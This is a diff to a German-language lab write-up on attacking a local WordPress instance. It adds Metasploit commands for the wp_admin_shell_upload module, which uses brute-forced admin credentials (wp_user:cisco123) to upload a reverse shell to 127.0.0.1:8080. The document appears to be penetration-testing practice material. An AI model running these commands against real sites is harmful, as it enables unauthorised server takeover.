@@ -112,8 +112,9 @@ Nachdem der **wpscan** command ausgeführt wurde, fangt der Angriff an. Als Erst
 
 Jetzt haben wir das Credentials für den Adminaccount: **wp_user:cisco123**
 
-### 2.2 Mit msf Wordpress exploiten
+### 2.2 Mit msf Wordpress scanen
 
+(Braucht man nicht machen, wenn man den scan von vorher gemacht hat)
 Da wir jetzt den Scan/Bruteforce attacke auf den Server ausgeführt haben, haben wir ja die Credentials des Kontos bekommen. Jetzt kann man mit metasploit einen exploit starten: 
 
 ```
@@ -126,3 +127,24 @@ exploit
 ```
 
 ![image](./IMAGES/wp_msf_1.png)
+
+
+### 2.3 Mit einer Reverse Shell den Server exploiten
+
+- https://www.hackingarticles.in/wordpress-reverse-shell/
+
+Um die Reverse Shell ausführen zu können braucht man die Credentials eines Admin Kontos! 
+
+```
+use exploit/unix/webapp/wp_admin_shell_upload
+set USERNAME wp_user
+set PASSWORD cisco123
+set rhosts 127.0.0.1 
+set rport 8080
+exploit
+```
+
+![image](./IMAGES/wp_exploit_rshell.png)
+
+
+
